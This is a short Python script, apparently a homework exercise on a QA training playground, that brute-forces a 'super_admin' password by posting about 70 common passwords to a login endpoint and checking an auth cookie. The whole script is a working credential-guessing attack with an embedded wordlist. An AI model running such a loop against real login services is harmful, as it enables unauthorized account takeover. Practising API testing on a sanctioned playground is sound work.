import requests

login = 'super_admin'
passwords = ['password', '123456', '123456789', '12345678', '12345', 'qwerty', 'abc123',
             'football', '1234567', 'monkey', '111111', 'letmein', '1234', '1234567890',
             'dragon', 'baseball', 'sunshine', 'iloveyou', 'trustno1', 'princess', 'adobe123[a]',
             '123123', 'welcome', 'login', 'admin', 'qwerty123', 'solo', '1q2w3e4r', 'master',
             '666666', 'photoshop[a]', '1qaz2wsx', 'qwertyuiop', 'ashley', 'mustang', '121212', 'starwars',
             '654321', 'bailey', 'access', 'flower', '555555', 'passw0rd', 'shadow', 'lovely',
             '7777777', 'michael', '!@#$%^&*', 'jesus', 'password1', 'superman', 'hello', 'charlie', '888888',
             '696969', 'hottie', 'freedom', 'aa123456', 'qazwsx', 'ninja', 'azerty', 'loveme', 'whatever', 'donald',
             'batman', 'zaq1zaq1', 'qazwsx', 'Football', '000000', '123qwe']
admin_password = ''

for password in passwords:
    data = {
        'login': login,
        'password': password
    }
    response = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework', data=data)

    response_cookie = requests.post('https://playground.learnqa.ru/ajax/api/check_auth_cookie',
                                    cookies=response.cookies)

    if response_cookie.text == 'You are authorized':
        admin_password = password
        print(f'Password is founded! It is "{admin_password}"')
        break
